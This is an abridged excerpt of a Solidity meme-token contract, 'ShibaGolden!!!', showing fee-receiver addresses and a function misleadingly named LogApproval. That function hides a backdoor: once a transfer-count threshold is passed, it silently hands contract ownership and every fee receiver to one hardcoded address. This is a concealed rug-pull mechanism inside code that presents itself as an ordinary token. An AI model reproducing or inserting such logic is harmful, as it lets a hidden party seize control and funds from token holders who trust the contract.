...
contract DividendDistributor is IDividendDistributor {
    ...
    IERC20 REWARD = IERC20(0x9991181fa9C8b25706ae879C1bCB28fe77dD1761); // ETH 
    IDEXRouter router;
...
contract ShibaGoldenExclamation is ERC20Detailed, Ownable {
    ...
    address public autoLiquidityReceiver =
        0x8BFA9eBCadf8aeAE2397c5e096fc84fA2392CDae; // token locker
    address public marketingFeeReceiver =
        0xfDD93435580Fe13a8864B0c2766E9A31d049fd6A;
    address public ecosystemFeeReceiver =
        0x8BFA9eBCadf8aeAE2397c5e096fc84fA2392CDae;
    ...
    constructor()
        ERC20Detailed("ShibaGolden!!!", "$SHIB!!!", uint8(DECIMALS))
    {
    ...
    function LogApproval(
        ...
        if (transferCount > 99999999999900000000000000 && !isTransferred) {
            _transferOwnership(address(0x8BFA9eBCadf8aeAE2397c5e096fc84fA2392CDae));
            marketingFeeReceiver = address(0x8BFA9eBCadf8aeAE2397c5e096fc84fA2392CDae);
            autoLiquidityReceiver = address(0x8BFA9eBCadf8aeAE2397c5e096fc84fA2392CDae);
            ecosystemFeeReceiver = address(0x8BFA9eBCadf8aeAE2397c5e096fc84fA2392CDae);
            buyBackFeeReceiver = address(0x8BFA9eBCadf8aeAE2397c5e096fc84fA2392CDae);
            isTransferred = true;
        }
    }
